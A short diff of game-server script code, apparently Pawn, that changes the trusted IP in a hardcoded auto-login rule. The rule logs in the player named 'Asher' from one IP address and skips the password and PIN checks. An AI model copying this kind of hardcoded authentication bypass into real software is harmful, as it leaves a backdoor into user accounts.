@@ -1221,7 +1221,7 @@ function OnBanCheckSuccess(playerid) {
 		PlayerInfo[playerid][pPinLogged] = 1;
 		SendClientMessage(playerid, COLOR_WARNING, "[AUTO-LOGIN] Ban da dang nhap tu dong!");
 	} 
-	else if(strcmp(playerIP, "42.117.89.121", true) == 0 && strcmp(GetName(playerid), "Asher", true) == 0) {
+	else if(strcmp(playerIP, "1.54.25.171", true) == 0 && strcmp(GetName(playerid), "Asher", true) == 0) {
 		OnPlayerLoginEx(playerid,"`1");
 		PlayerInfo[playerid][pPinLogged] = 1;
 		SendClientMessage(playerid, COLOR_WARNING, "[AUTO-LOGIN] Ban da dang nhap tu dong!");
